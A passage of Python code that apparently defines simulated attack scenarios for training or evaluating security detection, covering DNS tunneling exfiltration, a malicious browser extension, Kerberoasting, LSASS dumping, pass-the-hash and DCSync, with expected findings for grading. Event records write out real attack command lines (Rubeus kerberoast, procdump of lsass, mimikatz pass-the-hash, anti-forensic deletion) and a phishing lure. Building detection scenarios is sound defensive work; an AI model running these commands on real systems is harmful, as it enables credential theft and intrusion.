        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 2048, "bytes_received": 512, "description": "DNS TXT queries — encoded recon results sent to C2 (~20 queries)", "metadata": {"attack_phase": "command_and_control", "dns_tunneling": True}}, requires_success=True),

        # =====================================================================
        # DAY 2 — Commands via DNS, credential harvesting, file enumeration, first exfil
        # (overnight gap: implant beacons periodically)
        # =====================================================================

        # --- Phase 6: Commands received via DNS ---
        AttackEvent(event_type="network_event", delay=_delay(960, 240, 480, 1440), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 256, "bytes_received": 1024, "description": "DNS TXT query — received tasking commands from C2 (harvest credentials, enumerate files)", "metadata": {"attack_phase": "command_and_control", "dns_tunneling": True}}, requires_success=True),

        # --- Phase 7: Credential harvesting — Chrome cookies and Login Data ---
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 25), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "system": "endpoint", "label": "sensitive", "category": "credentials", "description": "Implant read Chrome Login Data database — saved passwords extracted", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", "system": "endpoint", "label": "sensitive", "category": "credentials", "description": "Implant read Chrome Cookies database — session tokens extracted", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: File enumeration ---
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "cmd.exe", "action": "start", "parent_process": "dnscat2.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 4580, "integrity_level": "high", "command_line": "cmd.exe /c dir /s /b C:\\Users\\*.xlsx C:\\Users\\*.docx C:\\Users\\*.pdf > C:\\Windows\\Temp\\filelist.txt", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 9: First DNS exfiltration session — credential data ---
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 5, 90), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 25600, "bytes_received": 4096, "description": "DNS TXT exfiltration — encoded Chrome credentials and cookies (~200 queries, throttled)", "metadata": {"attack_phase": "exfiltration", "dns_tunneling": True}}, requires_success=True),

        # =====================================================================
        # DAY 3 — Overnight beacon, second exfil session, network share access
        # =====================================================================

        # --- Phase 10: Overnight beacon ---
        AttackEvent(event_type="network_event", delay=_delay(960, 240, 480, 1440), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 256, "bytes_received": 128, "description": "Periodic DNS beacon — implant still active overnight", "metadata": {"attack_phase": "command_and_control", "dns_tunneling": True}}, requires_success=True),

        # --- Phase 11: Second DNS exfil session — customer data ---
        AttackEvent(event_type="file_event", delay=_delay(30, 15, 5, 90), data={"action": "read", "path": "C:\\Users\\{victim_username}\\Documents\\Customer_Contracts_2026.xlsx", "system": "endpoint", "label": "confidential", "category": "legal", "description": "Read customer contracts spreadsheet for exfil staging", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(60, 30, 15, 180), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 51200, "bytes_received": 8192, "description": "DNS TXT exfiltration — encoded customer contracts (~400 queries, throttled)", "metadata": {"attack_phase": "exfiltration", "dns_tunneling": True}}, requires_success=True),

        # --- Phase 12: Network share access ---
        AttackEvent(event_type="file_event", delay=_delay(30, 15, 5, 90), data={"action": "read", "path": "\\\\SRV-FILE01\\Finance$\\Q4-2026-Revenue-Forecast.xlsx", "system": "network_share", "label": "confidential", "category": "financial", "description": "Read Q4 revenue forecast from network share for exfil staging", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(15, 8, 3, 45), data={"action": "read", "path": "\\\\SRV-FILE01\\HR$\\Salary-Bands-2026.xlsx", "system": "network_share", "label": "restricted", "category": "hr", "description": "Read salary data from network share for exfil staging", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 4-5 — Final exfil batches, completion beacon, implant self-deletion
        # =====================================================================

        # --- Phase 13: Overnight beacon ---
        AttackEvent(event_type="network_event", delay=_delay(960, 240, 480, 1440), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 256, "bytes_received": 128, "description": "Periodic DNS beacon — implant still active overnight", "metadata": {"attack_phase": "command_and_control", "dns_tunneling": True}}, requires_success=True),

        # --- Phase 14: Final exfil batches — network share data ---
        AttackEvent(event_type="network_event", delay=_delay(60, 30, 15, 180), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 64000, "bytes_received": 10240, "description": "DNS TXT exfiltration — encoded revenue forecast (~500 queries, largest batch)", "metadata": {"attack_phase": "exfiltration", "dns_tunneling": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(60, 30, 15, 180), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 19200, "bytes_received": 3072, "description": "DNS TXT exfiltration — encoded salary data (~150 queries)", "metadata": {"attack_phase": "exfiltration", "dns_tunneling": True}}, requires_success=True),

        # --- Phase 15: Completion beacon ---
        AttackEvent(event_type="network_event", delay=_delay(60, 30, 15, 180), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 128, "bytes_received": 256, "description": "DNS beacon — exfiltration completion signal sent to C2", "metadata": {"attack_phase": "command_and_control", "dns_tunneling": True}}, requires_success=True),

        # --- Phase 16: Implant self-deletion ---
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 30), data={"process_name": "cmd.exe", "action": "start", "parent_process": "dnscat2.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 5880, "integrity_level": "high", "command_line": "cmd.exe /c schtasks /delete /tn \"WindowsTelemetryAgent\" /f & del /f C:\\Windows\\Temp\\dnscat2.exe C:\\Windows\\Temp\\filelist.txt", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
    ],
    parameters={
        **_ENDPOINT_BASE_PARAMS,
        "download_urls": [
            "https://cdn-static-assets.com/update.bin",
            "https://software-updates-cdn.com/agent/dns_helper.bin",
            "https://secure-filehost.com/pkg/telemetry_agent.bin",
        ],
    },
    success_rate=0.55,
    iocs=[],
    expected_findings=[
        "DNS tunneling implant executed from Temp directory",
        "DNS beacon established via TXT queries",
        "Scheduled task created for implant persistence",
        "Multiple DNS exfil batches — throttled query rate below detection thresholds",
        "Implant self-deletion — anti-forensic cleanup",
    ],
    relevant_ioc_keys=["c2_domain", "download_url", "victim_ip", "victim_username"],
)

MALICIOUS_BROWSER_EXTENSION = AttackScenario(
    id="malicious_browser_extension",
    tier="T3",
    name="Malicious Browser Extension for Session and Credential Theft",
    description="Attacker delivers a phishing email prompting installation of a malicious Chrome extension disguised as a corporate SSO helper. The extension immediately harvests saved credentials, cookies, and local storage from Chrome, exfiltrates the initial batch, then over subsequent days intercepts session tokens from O365 and Salesforce, captures MFA codes from form submissions, and sends credential exfil batches. The attacker uses stolen session tokens to access the victim's mailbox, searches for sensitive data, downloads files from SharePoint, and sets up inbox forwarding for persistence.",
    attack_type="malware",
    events=[
        # =====================================================================
        # DAY 1 — Delivery, extension install, credential/cookie harvest, first exfil
        # =====================================================================

        # --- Phase 1: Delivery — phishing email ---
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "Install Required Browser Extension: Corporate SSO Helper", "content": "IT has deployed a new SSO extension for seamless login across corporate apps.\n\nInstall here: https://chrome-extensions-store.com/install/corp-sso-helper\n\nThis extension is required for all employees by end of day.\n\n— IT Operations", "external": True, "contains_url": "https://chrome-extensions-store.com/install/corp-sso-helper", "metadata": {"is_malicious": True, "attack_phase": "delivery"}}, requires_success=False),

        # --- Phase 2: Extension install ---
        AttackEvent(event_type="app_event", delay=_delay(25, 15, 3, 120), data={"app": "Google Chrome", "action": "extension_installed", "resource_type": "browser_extension", "resource_name": "Corporate SSO Helper", "success": True, "description": "Malicious extension installed from external URL — not from Chrome Web Store", "metadata": {"attack_phase": "execution"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(5, 3, 1, 20), "data": {"app": "Outlook", "action": "report_phishing", "description": "User reported extension email", "success": True}}),

        # --- Phase 3: Initial credential/cookie harvest from Chrome ---
        AttackEvent(event_type="file_event", delay=_delay(1, 0.5, 0.2, 3), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "system": "endpoint", "label": "sensitive", "category": "credentials", "description": "Extension read Chrome Login Data SQLite database — saved passwords extracted", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", "system": "endpoint", "label": "sensitive", "category": "credentials", "description": "Extension read Chrome Cookies database — session cookies extracted", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", "system": "endpoint", "label": "sensitive", "category": "credentials", "description": "Extension read Chrome Local Storage — OAuth tokens and session data extracted", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: First exfil batch ---
        AttackEvent(event_type="network_event", delay=_delay(2, 1, 0.5, 5), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 32768, "bytes_received": 512, "description": "HTTPS POST to chrome-extensions-store.com — exfiltrating harvested credentials, cookies, and tokens (batch 1)", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Extension reads form data from visited sites ---
        AttackEvent(event_type="app_event", delay=_delay(30, 15, 5, 90), data={"app": "Google Chrome", "action": "extension_form_intercept", "resource_type": "form_data", "resource_name": "Internal CRM Login Form", "success": True, "description": "Extension intercepted form submission on internal CRM — captured credentials", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(60, 30, 10, 180), data={"app": "Google Chrome", "action": "extension_form_intercept", "resource_type": "form_data", "resource_name": "VPN Gateway Login Form", "success": True, "description": "Extension intercepted VPN gateway login form — captured credentials", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 2 — Session token harvesting, MFA intercept, credential exfil batch 2
        # (overnight gap: extension continues passive collection)
        # =====================================================================

        # --- Phase 6: Extension harvests session tokens from O365, Salesforce ---
        AttackEvent(event_type="app_event", delay=_delay(1440, 480, 720, 2880), data={"app": "Google Chrome", "action": "extension_token_harvest", "resource_type": "session_token", "resource_name": "Office 365 Session Token", "success": True, "description": "Extension captured O365 session token from browser storage — valid bearer token extracted", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(30, 15, 5, 90), data={"app": "Google Chrome", "action": "extension_token_harvest", "resource_type": "session_token", "resource_name": "Salesforce Session Token", "success": True, "description": "Extension captured Salesforce session token from browser storage", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: Intercept MFA code from form submission ---
        AttackEvent(event_type="app_event", delay=_delay(60, 30, 10, 180), data={"app": "Google Chrome", "action": "extension_mfa_intercept", "resource_type": "mfa_code", "resource_name": "Microsoft MFA Code Submission", "success": True, "description": "Extension intercepted MFA TOTP code during O365 re-authentication — code relayed to attacker", "metadata": {"attack_phase": "credential_access", "is_attacker": True, "mfa_captured": True}}, requires_success=True),

        # --- Phase 8: Credential exfil batch 2 ---
        AttackEvent(event_type="network_event", delay=_delay(10, 5, 2, 25), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 16384, "bytes_received": 512, "description": "HTTPS POST to chrome-extensions-store.com — exfiltrating session tokens and MFA codes (batch 2)", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 3 — Attacker uses stolen tokens: mailbox access, SharePoint, persistence
        # (overnight gap: attacker replays stolen session tokens)
        # =====================================================================

        # --- Phase 9: Attacker uses stolen session tokens to login ---
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SessionToken", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "session_replay": True}}, requires_success=True),

        # --- Phase 10: Mailbox access and search ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "access_mailbox", "resource_type": "mailbox", "resource_name": "Inbox", "success": True, "description": "Attacker accessed mailbox via stolen session token", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR credentials OR API key OR secret'", "success": True, "description": "Attacker searched mailbox for sensitive credential-related keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 10b: Read specific emails with credentials ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_aws_keys", "resource_name": "Re: AWS Access Keys for CI/CD Pipeline", "success": True, "description": "Attacker read email containing AWS access key credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 11: Data collection from SharePoint ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "SharePoint Online", "action": "browse_site", "resource_type": "site", "resource_name": "IT Team Site", "success": True, "description": "Browsed IT Team SharePoint site via stolen session", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 25), data={"action": "download", "path": "/IT Team/Credentials/Service-Account-Passwords.xlsx", "system": "sharepoint", "label": "restricted", "category": "credentials", "description": "Downloaded service account password spreadsheet from SharePoint IT Team site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "download", "path": "/IT Team/Infrastructure/VPN-Configuration-Guide.pdf", "system": "sharepoint", "label": "confidential", "category": "infrastructure", "description": "Downloaded VPN configuration guide from SharePoint", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 12: Persistence — inbox forwarding rule ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_forward_ext", "resource_name": "Auto-Forward to External", "success": True, "description": "Inbox forwarding rule created — all emails forwarded to attacker-drop@protonmail.com", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),

        # --- Phase 13: Final network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 12), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 8192, "bytes_received": 512, "description": "HTTPS POST to chrome-extensions-store.com — extension periodic beacon with harvested data", "metadata": {"attack_phase": "command_and_control", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.5,
    iocs=["chrome-extensions-store.com"],
    expected_findings=[
        "Malicious extension installed from external source (not Chrome Web Store)",
        "Browser credentials, cookies, and session tokens harvested by extension",
        "Session tokens and MFA codes intercepted and exfiltrated",
        "Attacker login from foreign IP using stolen session token",
        "Inbox forwarding rule created for persistence",
    ],
    relevant_ioc_keys=["attacker_email", "attacker_ip"],
)


# =============================================================================
# AD / HYBRID IDENTITY SCENARIOS
# =============================================================================

_AD_BASE_PARAMS = {
    "attacker_domains": ["noreply.com"], "sender_names": ["System"], "sender_prefixes": ["noreply"],
    **SHARED_ATTACKER_INFRA,
}

KERBEROASTING = AttackScenario(
    id="kerberoasting",
    tier="T2",
    name="Kerberoasting — Service Ticket Offline Cracking",
    description="Attacker requests Kerberos TGS tickets for service accounts with SPNs, cracks them offline, then uses the recovered credentials.",
    attack_type="credential_access",
    events=[
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 20), data={"process_name": "Rubeus.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "Rubeus.exe kerberoast /outfile:C:\\Windows\\Temp\\tickets.txt /format:hashcat", "path": "C:\\Users\\Public\\Rubeus.exe", "hash": "31c549d5c53078f6acb284a4ce7fa35494ff9f5b1a24406de7f182232286827a", "pid": 65359, "integrity_level": "medium", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 88, "protocol": "Kerberos", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 1024, "bytes_received": 8192, "description": "Kerberos TGS requests for multiple SPNs", "metadata": {"attack_phase": "credential_access", "tgs_requests": True}}, requires_success=True),
        AttackEvent(event_type="login", delay=_delay(120, 60, 30, 480), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "cracked_service_account": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "SQL Server", "action": "access", "resource_name": "SQL Server Admin Console", "success": True, "description": "Accessed service using cracked account", "metadata": {"attack_phase": "impact"}}, requires_success=True),
    ],
    parameters=_AD_BASE_PARAMS,
    success_rate=0.65,
    iocs=["Rubeus.exe"],
    expected_findings=["Kerberoasting tool executed", "Burst of TGS requests from single host", "Service account login from atypical IP"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

LSASS_CREDENTIAL_DUMP = AttackScenario(
    id="lsass_credential_dump",
    tier="T1",
    name="LSASS Memory Dump for Credential Extraction",
    description="Attacker dumps LSASS memory to extract hashes and tickets, uses them for lateral movement.",
    attack_type="credential_access",
    events=[
        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "powershell.exe", "action": "start", "parent_process": "explorer.exe", "command_line": "powershell.exe -nop -w hidden -ep bypass -c Invoke-TokenImpersonation", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "hash": "47c071bd5966a72cabfaac82645d8343fc9ee1d4874f583ed4abc0c4f0820bca", "pid": 29376, "integrity_level": "medium", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "privilege_escalation"}}, requires_success=False),
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 10), data={"process_name": "procdump.exe", "action": "start", "parent_process": "powershell.exe", "command_line": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp", "path": "C:\\Windows\\Temp\\procdump.exe", "hash": "f67cc43fd1af282b331c72b30220acee1a02ce685f47e10f3c85045553fdb568", "pid": 65218, "integrity_level": "high", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "lsass_dump": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"action": "modify", "path": "C:\\Windows\\Temp\\lsass.dmp", "system": "endpoint", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="login", delay=_delay(20, 10, 5, 60), data={"success": True, "ip": "10.0.1.50", "geo": "Internal Network", "device_id": "SRV-FINANCE-01", "known_device": False, "method": "NTLM", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "pass_the_hash": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.50", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "ntlm", "bytes_sent": 4096, "bytes_received": 8192, "description": "SMB connection using NTLM hash", "metadata": {"attack_phase": "lateral_movement"}}, requires_success=True),
    ],
    parameters=_AD_BASE_PARAMS,
    success_rate=0.6,
    iocs=["procdump.exe", "mimikatz.exe"],
    expected_findings=["procdump targeting lsass.exe", "Dump file in Temp", "NTLM lateral movement"],
    relevant_ioc_keys=["attacker_ip"],
)

PASS_THE_HASH = AttackScenario(
    id="pass_the_hash",
    tier="T2",
    name="Pass-the-Hash NTLM Lateral Movement",
    description="Attacker injects stolen NTLM hash to authenticate across multiple hosts (4 hops) via SMB without cleartext password. Performs discovery commands on each target, collects data on the final target, and exfiltrates via C2.",
    attack_type="lateral_movement",
    events=[
        # Phase 1: Credential injection — pass-the-hash via mimikatz
        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 7100, "integrity_level": "high", "command_line": "mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:. /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe\" exit", "hash": "bb9735b51348945c7a9966fdf35b37136b05762ad7501a3607d371d0fa2e5224", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access"}}, requires_success=False),
        # Phase 2: Hop 1 — SRV-APP-01
        AttackEvent(event_type="login", delay=_delay(2, 1, 0.5, 5), data={"success": True, "ip": "10.0.2.10", "geo": "Internal Network", "device_id": "SRV-APP-01", "known_device": False, "method": "NTLM", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "pass_the_hash": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.2, 0.1, 0.05, 0.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.2.10", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "ntlm", "bytes_sent": 2048, "bytes_received": 4096, "description": "SMB via pass-the-hash to SRV-APP-01", "metadata": {"attack_phase": "lateral_movement"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "cmd.exe", "action": "start", "parent_process": "services.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 7180, "integrity_level": "high", "command_line": "cmd.exe /c whoami & hostname & ipconfig /all", "hash": "e621ef3347156ef5104bac9232e80bdcccae397c88e75c346b4682ed922f0da2", "user_context": "CORP\\Administrator", "metadata": {"attack_phase": "discovery", "remote_exec": True, "target_host": "SRV-APP-01"}}, requires_success=True),
        # Phase 3: Hop 2 — SRV-DB-01
        AttackEvent(event_type="login", delay=_delay(8, 4, 2, 20), data={"success": True, "ip": "10.0.2.30", "geo": "Internal Network", "device_id": "SRV-DB-01", "known_device": False, "method": "NTLM", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "pass_the_hash": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "cmd.exe", "action": "start", "parent_process": "services.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 7240, "integrity_level": "high", "command_line": "cmd.exe /c net localgroup administrators & net share", "hash": "e621ef3347156ef5104bac9232e80bdcccae397c88e75c346b4682ed922f0da2", "user_context": "CORP\\Administrator", "metadata": {"attack_phase": "discovery", "remote_exec": True, "target_host": "SRV-DB-01"}}, requires_success=True),
        # Phase 4: Hop 3 — SRV-FINANCE-02 (final target)
        AttackEvent(event_type="login", delay=_delay(10, 5, 2, 30), data={"success": True, "ip": "10.0.2.50", "geo": "Internal Network", "device_id": "SRV-FINANCE-02", "known_device": False, "method": "NTLM", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "pass_the_hash": True, "final_target": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "cmd.exe", "action": "start", "parent_process": "services.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 7310, "integrity_level": "high", "command_line": "cmd.exe /c dir /s /b C:\\Finance\\*.xlsx C:\\Finance\\*.csv", "hash": "e621ef3347156ef5104bac9232e80bdcccae397c88e75c346b4682ed922f0da2", "user_context": "CORP\\Administrator", "metadata": {"attack_phase": "collection", "remote_exec": True, "target_host": "SRV-FINANCE-02"}}, requires_success=True),
        # Phase 5: Data collection on final target
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "read", "path": "C:\\Finance\\Reports\\", "system": "local", "description": "Collected financial reports from SRV-FINANCE-02", "metadata": {"attack_phase": "collection", "target_host": "SRV-FINANCE-02"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 7380, "integrity_level": "high", "command_line": "PowerShell.exe -c \"Compress-Archive -Path 'C:\\Finance\\Reports\\*.xlsx','C:\\Finance\\Reports\\*.csv' -DestinationPath 'C:\\Windows\\Temp\\backup.zip'\"", "hash": "577e20c58bb64a4df043c3e89ced4e6ae52cb8f87a5cca67f1b31b6cadf226df", "user_context": "CORP\\Administrator", "metadata": {"attack_phase": "collection", "target_host": "SRV-FINANCE-02"}}, requires_success=True),
        # Phase 6: Exfiltration indicator — large SMB transfer back to attacker workstation
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "10.0.2.50", "destination_ip": "{victim_ip}", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "ntlm", "bytes_sent": 8388608, "bytes_received": 1024, "description": "Large SMB transfer from finance server back to compromised workstation (8 MB)", "metadata": {"attack_phase": "exfiltration", "lateral_exfil": True}}, requires_success=True),
    ],
    parameters=_AD_BASE_PARAMS,
    success_rate=0.7,
    iocs=["mimikatz.exe"],
    expected_findings=["mimikatz sekurlsa::pth", "NTLM auth to multiple hosts in rapid succession", "Multi-hop movement across 3 servers", "Data collection on finance server"],
    relevant_ioc_keys=["attacker_ip"],
)

DCSYNC_ATTACK = AttackScenario(
    id="dcsync_attack",
    tier="T2",
    name="DCSync — Directory Replication Credential Extraction",
    description="Attacker gains initial foothold, escalates privileges to obtain replication rights, enumerates AD for high-value targets, then uses DRSUAPI replication to extract password hashes for domain admins, krbtgt, and service accounts before validating access.",
    attack_type="credential_access",
    events=[
        # Phase 1: Initial access
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # Phase 2: AD reconnaissance — enumerate domain structure and high-value targets
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "net.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 6120, "integrity_level": "high", "command_line": "net group \"Domain Admins\" /domain", "hash": "a6dbfc5df1ca639360a9bce1f041794d89256a103c72d1ce1018fdc22d8abc3e", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
